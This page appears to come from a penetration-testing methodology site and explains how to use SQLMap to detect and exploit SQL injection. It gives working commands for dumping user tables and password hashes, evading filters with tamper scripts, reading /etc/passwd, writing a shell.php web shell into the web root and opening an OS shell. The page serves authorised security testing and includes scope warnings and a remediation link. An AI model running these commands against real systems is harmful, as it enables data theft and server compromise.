---
layout: page
title: "SQLMap"
subtitle: "Automating detection, tuning and extraction once an SQL injection is suspected"
permalink: /methodology/web-app/sqlmap/
---

SQLMap automates the detection and exploitation of SQL injection. Use it after a manual check has suggested an injectable parameter, so that its results can be verified and its request volume is scoped. SQLMap sends many requests and writes them to a log, and its default user agent is easy for filters to recognise, so the run should be tuned to the target.

## Workflow

1. Capture the request. Choose the input method that matches the request:

- GET parameter: `-u` with the URL.
- POST data: `--data` with the body.
- Complex request, such as one with headers or a JSON body: save it from the proxy to a file and pass it with `-r`. Mark the injection point with `*`.
- In the browser network panel, use "Copy as cURL" and replace the `curl` command with `sqlmap`.

```bash
sqlmap -u "http://TARGET_URL/" --data="uid=1&name=test" --batch
sqlmap -r req.txt --batch
```

Session cookies are passed with `--cookie`:

```bash
sqlmap -u "http://TARGET_URL/?id=1" --cookie="PHPSESSID=SESSION_ID" --batch
```

2. Run a baseline with defaults:

```bash
sqlmap -u "http://TARGET_URL/?id=1" --batch
```

3. Read the output. The messages that matter most are:

| Message | Meaning |
|---|---|
| Target URL content is stable | Repeated identical requests return the same response, so comparisons are reliable |
| Parameter appears to be dynamic | Changing the value changes the response |
| Heuristic test shows the parameter might be injectable | Often triggered by a DBMS error. Not yet confirmed |
| Parameter appears to be injectable (with `--string="STRING"`) | Boolean test matched a constant string. Verify it by hand |
| Parameter is vulnerable | Confirmed. SQLMap then lists each injection point with its payload |

Logs and session data are saved in the SQLMap output directory for each target.

4. Tune the detection when the default run is slow, blocked or inconclusive:

```bash
sqlmap -u "http://TARGET_URL/?id=1" --level=5 --risk=3 -v 3
sqlmap -u "http://TARGET_URL/?id=1" --technique=BEU
sqlmap -u "http://TARGET_URL/?id=1" --union-cols=17 --union-char='a' --union-from=users
sqlmap -u "http://TARGET_URL/?q=test" --prefix="%'))" --suffix="-- -"
```

| Option | Use |
|---|---|
| `--level` (1 to 5) | Extends the payload vectors and boundaries tested |
| `--risk` (1 to 3) | Adds vectors with a higher chance of side effects. Login bypass with `OR` payloads may need a higher risk |
| `--technique` | Restricts the techniques, for example `BEU` for boolean, error and union |
| `--code`, `--titles`, `--strings`, `--text-only` | Separate true from false responses when the page is highly dynamic |
| `--union-cols`, `--union-char`, `--union-from` | Help UNION payloads when the column count is known or the dummy values are rejected |
| `--prefix`, `--suffix` | Wrap the payload when the original query has extra closing characters |
| `--eval` | Compute a dependent parameter with Python, such as an MD5 of another value |

5. Enumerate after confirmation. Start with basic facts, then narrow to the table of interest:

```bash
sqlmap -u "http://TARGET_URL/?id=1" --banner --current-user --current-db --is-dba
sqlmap -u "http://TARGET_URL/?id=1" --tables -D testdb
sqlmap -u "http://TARGET_URL/?id=1" --dump -T users -D testdb
sqlmap -u "http://TARGET_URL/?id=1" --dump -T users -D testdb -C name,surname
sqlmap -u "http://TARGET_URL/?id=1" --dump -T users -D testdb --start=2 --stop=3
sqlmap -u "http://TARGET_URL/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
sqlmap -u "http://TARGET_URL/?id=1" --schema
sqlmap -u "http://TARGET_URL/?id=1" --search -C pass
sqlmap -u "http://TARGET_URL/?id=1" --passwords --batch
```

Use `--exclude-sysdbs` with a full `--dump` to skip system databases.

6. Work around protections when the target blocks the run:

```bash
sqlmap -u "http://TARGET_URL/?id=1" --random-agent --skip-waf
sqlmap -u "http://TARGET_URL/?id=1" --tamper=between,randomcase,space2comment
sqlmap -u "http://TARGET_URL/" --data="id=1&csrf-token=TOKEN" --csrf-token="csrf-token"
sqlmap -u "http://TARGET_URL/?id=1&rp=29125" --randomize=rp --batch
```

| Tamper script | Effect |
|---|---|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #` |
| `randomcase` | Changes the case of each keyword character |
| `space2comment` | Replaces spaces with comments |
| `space2plus` | Replaces spaces with `+` |
| `equaltolike` | Replaces `=` with `LIKE` |
| `versionedkeywords` | Wraps non-function keywords in MySQL versioned comments |
| `base64encode` | Base64-encodes the payload |
| `percentage` | Adds `%` before each character |

Other options include `--chunked` (splits the POST body into chunks) and HTTP parameter pollution, which splits the payload across repeated parameter names.

7. Reach the operating system only when the scope and written authorisation allow it:

```bash
sqlmap -u "http://TARGET_URL/?id=1" --is-dba
sqlmap -u "http://TARGET_URL/?id=1" --file-read "/etc/passwd"
sqlmap -u "http://TARGET_URL/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
sqlmap -u "http://TARGET_URL/?id=1" --os-shell --technique=E
```

When `--os-shell` fails on UNION, switch to error-based with `--technique=E`. Without `--batch`, SQLMap asks for the server language and web root. The `--batch` option accepts the defaults silently.

> Writing a file to the web root and executing commands change the target. Confirm the scope and the written authorisation first, and remove any file that was uploaded at the end of the test.
{: .danger }

## Pitfalls

- The default SQLMap user agent is recognised by many filters. Use `--random-agent` when the target blocks the run.
- Raising `--level` and `--risk` multiplies the number of requests and may trigger blocking.
- `--batch` hides the questions SQLMap asks. Run interactively once to see what it chooses.
- `--all` dumps everything it can reach. Restrict the run to the tables needed for the finding.
- Detected protections can make later responses unstable. Check that the baseline is still stable before trusting a result.

> Defense: parameterised queries prevent the injection that SQLMap relies on. See [Prevention and remediation](/methodology/web-app/prevention/).
{: .info }
